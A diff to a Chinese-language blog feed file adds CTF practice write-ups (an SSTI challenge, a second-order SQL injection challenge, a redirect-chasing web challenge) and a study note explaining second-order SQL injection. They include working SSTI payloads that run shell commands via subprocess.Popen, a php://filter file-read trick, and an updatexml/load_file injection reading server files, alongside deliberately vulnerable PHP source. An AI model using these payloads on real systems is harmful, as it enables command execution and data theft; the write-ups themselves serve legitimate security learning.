@@ -4,6 +4,106 @@
   
     
     <entry>
+      <title>日常练习38</title>
+      <link href="test88/undefined-undefined.html"/>
+      <url>test88/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>写一下最近写的题目思路。  </p><h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><p>这道题比较简单，主要是比较绕。  </p><p>打开题目发现他会从最刚开始的一个界面跳转到die这个页面  </p><p><a href="https://pic.imgdb.cn/item/60fe999a5132923bf816d1c3.png"><img src="https://pic.imgdb.cn/item/60fe999a5132923bf816d1c3.png"></a>  </p><p>这个是开始界面，最后会跳转到另一个界面  </p><p><a href="https://pic.imgdb.cn/item/60fe99e05132923bf817b1cd.png"><img src="https://pic.imgdb.cn/item/60fe99e05132923bf817b1cd.png"></a>  </p><p>但是这个页面是没有用的，而我们这道题可以使用抓包来抓到第一个页面，从而获取有用信息。  </p><p><a href="https://pic.imgdb.cn/item/60fe9a335132923bf818c7d7.png"><img src="https://pic.imgdb.cn/item/60fe9a335132923bf818c7d7.png"></a>  </p><p>可以看到抓包信息中提到了有/chase/这个页面，那我们就继续抓包来查看这个页面。   </p><p><a href="https://pic.imgdb.cn/item/60fe9a935132923bf81a0842.png"><img src="https://pic.imgdb.cn/item/60fe9a935132923bf81a0842.png"></a>  </p><p>可以看到这里的代码其实说了只有当选择left的时候才会进入下一个页面/leftt/，我们直接查看这个页面。  </p><p><a href="https://pic.imgdb.cn/item/60fe9b015132923bf81b8953.png"><img src="https://pic.imgdb.cn/item/60fe9b015132923bf81b8953.png"></a>   </p><p>可以看到这个页面又指向了另一个界面/shoot/而我们也是可以直接通过抓包查看这个界面的。后面还会有好几次这样的操作，就是会在一个页面的信息里给你下一个页面的地址，并且这些都可以抓包来看。我们这里直接跳到最后一个页面。  </p><p><a href="https://pic.imgdb.cn/item/60fe9ba15132923bf81d94c8.png"><img src="https://pic.imgdb.cn/item/60fe9ba15132923bf81d94c8.png"></a>  </p><p>当我们进入/static/js/fight.js这份界面时便可以看到包含flag的代码：  </p><pre><code>function check_action() &#123;var action = document.getElementById(&quot;action&quot;).value;var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];  </code></pre><p>可以看到这个flag是被打乱的，这里可以用脚本来复原，也可以手动复原。  </p><pre><code>from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:k = &#39;&#39;.join(list(i))if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] == &#39;&#125;&#39;:    print(k)</code></pre><p>得到flag。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实并不难，提示给的很明显，一个个跳转就ok了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test88 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习37</title>
+      <link href="test87/undefined-undefined.html"/>
+      <url>test87/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天是一个ssti注入题目，比较简单，算是一个知识点的扩充。  </p><h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><p>打开题目，f12可以看到提示：  </p><p><a href="https://pic.imgdb.cn/item/60fcb5745132923bf81a85fa.png"><img src="https://pic.imgdb.cn/item/60fcb5745132923bf81a85fa.png"></a>  </p><p>让我们get方式传参，变量名使search。我们直接传{ {7*7} }，测试是不是ssti注入。  </p><p><a href="https://pic.imgdb.cn/item/60fcb5f15132923bf81c5386.png"><img src="https://pic.imgdb.cn/item/60fcb5f15132923bf81c5386.png"></a>   </p><p>确实是ssti注入，接下来就是按照流程走一遍。但是这道题有点不一样的就是要利用</p><pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code></pre><p>爆出所有类。原理暂且不知，先把他当作一个知识点。  </p><p><a href="https://pic.imgdb.cn/item/60fcb6c45132923bf81f680c.png"><img src="https://pic.imgdb.cn/item/60fcb6c45132923bf81f680c.png"></a></p><p>然后就是找到可用的类。这里我们找的是subprocess.Popen这个类，然后进行构造payload来命令执行。  </p><pre><code>?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><p>关于这个payload有很多构造方式，网上也有很多形式，可以慢慢积累。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>总的来说这是一道中规中矩的ssti题目，解题流程没怎么变，重点还是这个找所有类的不同方法，算是一个小技巧吧。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test87 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习36——二次注入练习</title>
+      <link href="test86/undefined-undefined.html"/>
+      <url>test86/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天做几道关于二次注入的题目，回顾一下新学的注入方式。  </p><h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><a href="https://pic.imgdb.cn/item/60f042b45132923bf8af063a.png"><img src="https://pic.imgdb.cn/item/60f042b45132923bf8af063a.png"></a>  </p><p>打开题目，f12可以看到提示让我们使用php伪协议来读取网页源码。  </p><pre><code>?file=php://filter/convert.base64-encode/resource=xxx.php</code></pre><p>有五个页面，分别是index.php,search.php,change.php.delect.php,confirm.php。利用伪协议读取后进行base64解码就能得到源码，下面附上源码：  </p><pre><code>index.php&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file))&#123;if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;    echo(&#39;no way!&#39;);    exit;&#125;@include($file);&#125;?&gt;search.php&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;$msg = &#39;&#39;;$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;$user_name = $_POST[&quot;user_name&quot;];$phone = $_POST[&quot;phone&quot;];if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;     $msg = &#39;no sql inject!&#39;;&#125;else&#123;    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;    $fetch = $db-&gt;query($sql);&#125;if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;    $row = $fetch-&gt;fetch_assoc();    if(!$row) &#123;        echo &#39;error&#39;;        print_r($db-&gt;error);        exit;    &#125;    $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;&#125; else &#123;    $msg = &quot;未找到订单!&quot;;&#125;&#125;else &#123;$msg = &quot;信息不全&quot;;&#125;?&gt;change.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;$msg = &#39;&#39;;$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;$user_name = $_POST[&quot;user_name&quot;];$address = addslashes($_POST[&quot;address&quot;]);$phone = $_POST[&quot;phone&quot;];if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;    $msg = &#39;no sql inject!&#39;;&#125;else&#123;    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;    $fetch = $db-&gt;query($sql);&#125;if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;    $row = $fetch-&gt;fetch_assoc();    $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];    $result = $db-&gt;query($sql);    if(!$result) &#123;        echo &#39;error&#39;;        print_r($db-&gt;error);        exit;    &#125;    $msg = &quot;订单修改成功&quot;;&#125; else &#123;    $msg = &quot;未找到订单!&quot;;&#125;&#125;else &#123;$msg = &quot;信息不全&quot;;&#125;?&gt;delete.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;$msg = &#39;&#39;;$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;$user_name = $_POST[&quot;user_name&quot;];$phone = $_POST[&quot;phone&quot;];if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;     $msg = &#39;no sql inject!&#39;;&#125;else&#123;    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;    $fetch = $db-&gt;query($sql);&#125;if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;    $row = $fetch-&gt;fetch_assoc();    $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);    if(!$result) &#123;        echo &#39;error&#39;;        print_r($db-&gt;error);        exit;    &#125;    $msg = &quot;订单删除成功&quot;;&#125; else &#123;    $msg = &quot;未找到订单!&quot;;&#125;&#125;else &#123;$msg = &quot;信息不全&quot;;&#125;?&gt;confirm.php&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;$msg = &#39;&#39;;$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;$user_name = $_POST[&quot;user_name&quot;];$address = $_POST[&quot;address&quot;];$phone = $_POST[&quot;phone&quot;];if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;    $msg = &#39;no sql inject!&#39;;&#125;else&#123;    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;    $fetch = $db-&gt;query($sql);&#125;if($fetch-&gt;num_rows&gt;0) &#123;    $msg = $user_name.&quot;已提交订单&quot;;&#125;else&#123;    $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;    $re = $db-&gt;prepare($sql);    $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);    $re = $re-&gt;execute();    if(!$re) &#123;        echo &#39;error&#39;;        print_r($db-&gt;error);        exit;    &#125;    $msg = &quot;订单提交成功&quot;;&#125;&#125; else &#123;$msg = &quot;信息不全&quot;;&#125;?&gt;</code></pre><p>代码较多，但是对于这种可以修改信息的我们可以先判定为二次注入的题型，我们直接查看修改页面的代码。  </p><p>我们可以看到在change.php代码中有这样一段代码：  </p><pre><code>if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;$msg = &#39;&#39;;$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;$user_name = $_POST[&quot;user_name&quot;];$address = addslashes($_POST[&quot;address&quot;]);$phone = $_POST[&quot;phone&quot;];if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;    $msg = &#39;no sql inject!&#39;;&#125;else&#123;    $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;    $fetch = $db-&gt;query($sql);&#125;  </code></pre><p>这里它只对address进行了转义，还是我们熟悉的addslashes()函数，接着我们可以看到它的进行数据更新的sql语句：  </p><pre><code>$sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];  </code></pre><p>也就是说，当我们第一次注入时name和phone变量没问题后，我们的address变量会被存入数据库中，而在第二次我们进行修改时，我们新的address变量不会再经过转义函数，而是直接放入sql语句中执行。  </p><p>而我们可以再代码结尾发现  </p><pre><code>if(!$result) &#123;echo &#39;error&#39;;print_r($db-&gt;error);exit;&#125;   </code></pre><p>会回显数据库的报错信息，那么我们就可以使用报错注入搭配二次注入来达到获取flag的效果。  </p><p>接下来就是如何构造第一次注入的sql语句，从而能让他在我们第二次注入时发挥作用。  </p><p>payload如下：  </p><pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#注意这里通过LOAD_FILE()函数将文件内容读取成字符串，是一个小知识点。</code></pre><p>我们首先进行第一次的提交，在地址一栏输入payload。  </p><p><a href="https://pic.imgdb.cn/item/60f048245132923bf8dd6ff2.png"><img src="https://pic.imgdb.cn/item/60f048245132923bf8dd6ff2.png"></a>  </p><p>毫无疑问，这样是可以提交成功的，那么我们的address变量就变成了，我们输入的payload，接着我们进行修改地址的操作。  </p><p><a href="https://pic.imgdb.cn/item/60f04aa55132923bf8f4575a.png"><img src="https://pic.imgdb.cn/item/60f04aa55132923bf8f4575a.png"></a></p><p>也就是把payload再输入一边，那么我们最后执行修改的sql的语句就变成了</p><pre><code>$sql = &quot;update `user` set `address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#&#39;, `old_address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>我们可以看到语句中的old_address就是我们第一次的地址，而我们payload的结尾的#符号是注释符，会将后面的sql语句注释掉，所以说执行的sql语句是这样的：  </p><pre><code>$sql = &quot;update `user` set `address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1), `old_address`=&#39;1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)</code></pre><p>这样就完成了第二次的注入，去掉了原本sql语句中的</p><pre><code> where `user_id`=&quot;.$row[&#39;user_id&#39;];  </code></pre><p>这一sql语句，从而使查询报错，得到了flag。  </p><p><a href="https://pic.imgdb.cn/item/60f04ebe5132923bf817ff3d.png"><img src="https://pic.imgdb.cn/item/60f04ebe5132923bf817ff3d.png"></a>  </p><p>接下来再读取右半段flag即可。   </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>对于二次注入多出现在可以修改信息的题目中，可以通过源码观察第一次注入的过程中是否对输入的信息进行转义并存入数据库中，而且并没有对对二次注入的信息进行修改。如果发现这样的sql语句，就可以开始思考sql二次注入。  </p><p>同时。二次注入的重点在于如何构造恶意语句和了解sql语句的如何写成，针对来写恶意语句。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test86 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>二次注入</title>
+      <link href="note9/undefined-undefined.html"/>
+      <url>note9/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>由于前段时间的期末考试以及老师讲课进度比较慢，所以把时间大多花在了学习上，如今再次捡起，还是要从sql注入开始，今天学一个很重要的sql注入——二次注入。  </p><h2 id="什么是二次注入？"><a href="#什么是二次注入？" class="headerlink" title="什么是二次注入？"></a>什么是二次注入？</h2><p> ——何为二次注入？</p><p> ——为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这些数据却又在“未被转义（Unescaped）”的查询窗体中重复使用。</p><p>这里提到了转义一词，而这个转义所用到的函数也正是我们之前所遇到的addslashes()函数，这个函数在很多sql注入中起到转义的作用，而它具体的转义原理可以回顾之前我写的那一篇wp。  </p><p>也就是说二次注入和普通注入的最大区别就是二次注入要注入两次，二第一次注入正是为了给第二次注入铺垫条件的。  </p><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>那么为什么会产生二次注入的漏洞呢？这个很好理解。  </p><p>对于一般的注入，当我们构造完sql语句并且提交后，语句是会立即生效的。而对于二次注入则不是这样。   </p><p>二次注入会对第一次构造的语句进行过滤转义，也就是用到了上面说到的函数，这就造成我们第一次构造的sql语句无法生效。但是二次注入的漏洞就在于当我们第二次构造sql注入时它是没有转义过滤机制的（而第二次注入在题目中的表现一般为修改密码等修改信息类的操作）。那么我们就可以利用这一点，在第一次注入的时候先构造一个恶意的sql语句，然后再用第二次sql注入利用起来，从而达到sql注入的效果。  </p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>用模拟登陆和修改密码进行操作：  </p><p>首先假设我们注册了两个用户：  </p><pre><code>用户1名字为“csdner”，密码是“csdner123456”；用户2名字为“csndner&#39;--” ，密码是“csdner1111”。  </code></pre><p>注意这里的用户2的名字是sql注入的有效负载，为**csndner’–**这个奇怪的名字不会被转义或者截断，也就原样保存在数据库中。  </p><p>接下来我们修改用户2的密码为csdn222，那么我们的sql语句应该是以下这样：  </p><pre><code>UPDATE usersSET password=&#39;csdn222&#39;WHERE username=&#39;csdner&#39;--&#39; and password=&#39;csdn1111&#39;</code></pre><p>我们已经知道–在sql语句中是注释的意思，所以说这个修改的sql语句在–后面的语句都被注释掉了，那么它的最终执行的语句就是这样的：  </p><pre><code>UPDATE usersSET password=&#39;csdn222&#39;WHERE username=&#39;csdner&#39;</code></pre><p>这就导致我们修改的密码是用户csdner的密码，这就可以让我们在原本不知道csdner用户的密码的情况下修改它的密码并且登录，达到了二次注入的效果。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>简单总结一下二次注入，我们可以分为两部，第一步就是第一次构造恶意的sql语句（不会被转义截断的有效负载），为我们第二次注入构造条件。第二部就是配合第一次的恶意语句来进行sql注入，达到一般sql注入的目的。  </p><p>总的来说，目前看到的SQL注入大都是利用报错注入来查看数据的，关于这一点的题型应该还有别的，遇到了在做总结吧。</p><p>参考：<a href="https://blog.csdn.net/weixin_42574142/article/details/83388231?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162134760816780357292461%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162134760816780357292461&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-1-83388231.first_rank_v2_pc_rank_v29&utm_term=sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4449">SQL二次注入</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> note9 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>日常练习36</title>
       <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
       <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
